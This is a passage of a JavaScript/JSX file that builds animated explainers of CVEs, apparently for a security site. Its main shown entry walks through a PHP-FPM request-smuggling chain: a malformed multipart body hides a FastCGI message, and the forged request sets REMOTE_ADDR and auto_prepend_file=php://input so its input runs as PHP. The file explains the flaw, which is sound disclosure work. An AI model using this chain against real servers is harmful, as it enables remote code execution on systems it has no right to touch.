    draw(tl, q, '.w-3', 3, .1); show(tl, q, '.s-query', 3.1); type(tl, q, '.s-query .dm-l', 3.25, .25); pop(tl, q, '.s-second', 3.8); glow(tl, q, '.s-query', 3.8, A);
    draw(tl, q, '.w-4', 4, .1); show(tl, q, '.s-db', 4.1); tl.fromTo(q('.s-new'), {autoAlpha: 0, x: -14}, {autoAlpha: 1, x: 0, duration: .3}, 4.55); glow(tl, q, '.s-db', 4.75, A);
  },
};

const php = {
  impact: 3.35,
  acts: [
    {label: 'One request', text: 'One HTTP request. Its multipart body is malformed on purpose, and a FastCGI message is tucked in right after the point where PHP will stop parsing.'},
    {label: 'Kept open', text: 'The front end forwards it to PHP-FPM over a FastCGI connection that stays open for the next request.'},
    {label: 'Left unread', text: 'The application opens php://input and never reads to the end. Shutdown sees the stream, assumes the body was handled, and skips the drain.'},
    {label: 'Misread', text: 'PHP-FPM keeps the connection and reads what is left on it as a new FastCGI request. The front end never sent one.'},
    {label: 'Executed', text: 'The forged request picks its own script, client address and PHP settings, which can make its input run as PHP in the worker.'},
  ],
  Stage: () => <>
    <Wires><W k="w-in" d="M30 12 H34"/><W k="w-fwd" d="M54 12 H62"/><W k="w-left" d="M47 27.5 V37 H62"/></Wires>
    <div className="dm-card s-req" style={P(2, 8, 28)}><h5>HTTP request · no login</h5>
      <code className="dm-l"><b>POST</b> /upload.php</code>
      <code className="dm-l">Content-Type: multipart/form-data</code>
      <code className="dm-l">[ malformed multipart part ]</code>
      <code className="dm-l"><i>[ FastCGI message in the body ]</i></code>
    </div>
    <div className="dm-card s-front" style={P(34, 8, 20)}><h5>Front end · nginx</h5><code className="dm-l">fastcgi_keep_conn <b>on</b></code></div>
    <span className="dm-note s-conn" style={P(34.5, 39)}>On the kept-alive connection</span>
    <div className="dm-cells s-cells" style={{...P(34.5, 45, 24), gridTemplateColumns: 'repeat(20, 1fr)'}}>
      {Array.from({length: 20}, (_, i) => <i key={i} className={i < 4 ? 'c-p' : i < 10 ? 'c-r' : 'c-u'}/>)}
    </div>
    <span className="dm-note s-lab" style={P(34.5, 50.5)}>params · body read</span>
    <span className="dm-note is-hot s-lab2" style={P(46.6, 50.5)}>unread bytes</span>
    <div className="dm-box s-fpm" style={P(60, 5, 38.5, 90)}><h5>PHP-FPM worker</h5></div>
    <div className="dm-card s-app" style={P(62, 11, 34.5)}><h5>Application</h5>
      <code className="dm-l">$in = fopen('php://input', 'r');</code><code className="dm-l">// never read to the end</code>
    </div>
    <div className="dm-card s-shut" style={P(62, 35, 34.5)}><h5>Request shutdown · SAPI.c</h5>
      <code className="dm-l">php://input stream exists</code><code className="dm-l"><i>so: skip draining the body</i></code>
    </div>
    <div className="dm-card s-forged" style={P(62, 60, 34.5)}><h5>Next FastCGI request · parsed from leftovers</h5>
      <code className="dm-l">SCRIPT_FILENAME=/var/www/index.php</code>
      <code className="dm-l">REMOTE_ADDR=<i>127.0.0.1</i></code>
      <code className="dm-l">PHP_ADMIN_VALUE=<i>auto_prepend_file=php://input</i></code>
    </div>
    <span className="dm-chip is-hot s-never" style={P(35, 66)}>the front end never sent this</span>
    <span className="dm-chip is-hot s-run" style={P(35, 80)}>its input runs as PHP in the worker</span>
  </>,
  build(tl, q, A) {
    show(tl, q, '.s-req', 0); type(tl, q, '.s-req .dm-l', .15, .18);
    draw(tl, q, '.w-in', 1, .1); show(tl, q, '.s-front', 1.08); draw(tl, q, '.w-fwd', 1.3, .15); show(tl, q, '.s-fpm', 1.4); show(tl, q, '.s-conn', 1.5);
    tl.fromTo(q('.s-cells i'), {autoAlpha: 0, backgroundColor: 'rgba(243,240,247,.42)'}, {autoAlpha: 1, backgroundColor: 'rgba(243,240,247,.42)', duration: .1, stagger: .02}, 1.5);
    show(tl, q, '.s-app', 2); type(tl, q, '.s-app .dm-l', 2.12, .16); show(tl, q, '.s-lab', 2.3); show(tl, q, '.s-shut', 2.45); type(tl, q, '.s-shut .dm-l', 2.55, .14);
    tl.to(q('.c-u'), {backgroundColor: A, boxShadow: `0 0 10px ${A}`, duration: .1, stagger: .02}, 2.7); show(tl, q, '.s-lab2', 2.75); glow(tl, q, '.s-shut', 2.85, A);
    draw(tl, q, '.w-left', 3, .3); show(tl, q, '.s-forged', 3.3); type(tl, q, '.s-forged .dm-l', 3.4, .14); pop(tl, q, '.s-never', 3.8);
    glow(tl, q, '.s-forged', 4.1, A); tl.to(q('.s-fpm'), {borderStyle: 'solid', borderColor: A, duration: .3}, 4.2); pop(tl, q, '.s-run', 4.4);
  },
};

export default {
  'CVE-2026-33017': langflow,
  'CVE-2026-129289': php,
  'CVE-2026-115563': mcpPython,
  'CVE-2026-104850': mcpTypescript,
  'CVE-2026-69258': flowise,
  'CVE-2026-73081': apCommand,
  'CVE-2026-73083': apIsolate,
  'CVE-2026-73084': apXss,
  'CVE-2026-53923': vllm,
  'CVE-2026-32628': anythingllm,
};
